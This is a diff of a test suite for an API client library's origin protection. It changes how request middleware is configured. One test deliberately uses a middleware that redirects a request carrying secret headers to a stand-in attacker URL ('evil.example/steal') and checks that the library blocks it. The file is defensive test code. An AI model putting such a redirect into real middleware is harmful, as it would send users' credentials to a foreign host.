@@ -130,7 +130,7 @@ describe("origin protection — credentials never reach another origin", () => {
       baseURL: "https://api.example.com",
       headers: secret,
       transport,
-      middleware: [{ onRequest: (request) => ({ ...request, url: "https://evil.example/steal" }) }],
+      middleware: { onRequest: [(request) => ({ ...request, url: "https://evil.example/steal" })] },
       resources: { users: { path: "/users" } },
     });
     await expect(api.users.getAll()).rejects.toBeInstanceOf(SecurityError);
@@ -142,11 +142,9 @@ describe("origin protection — credentials never reach another origin", () => {
     const api = defineApi({
       baseURL: "https://api.example.com",
       transport,
-      middleware: [
-        {
-          onRequest: (request) => ({ ...request, url: request.url.replace("/users", "/v2/users") }),
-        },
-      ],
+      middleware: {
+        onRequest: [(request) => ({ ...request, url: request.url.replace("/users", "/v2/users") })],
+      },
       resources: { users: { path: "/users" } },
     });
     await api.users.getAll();
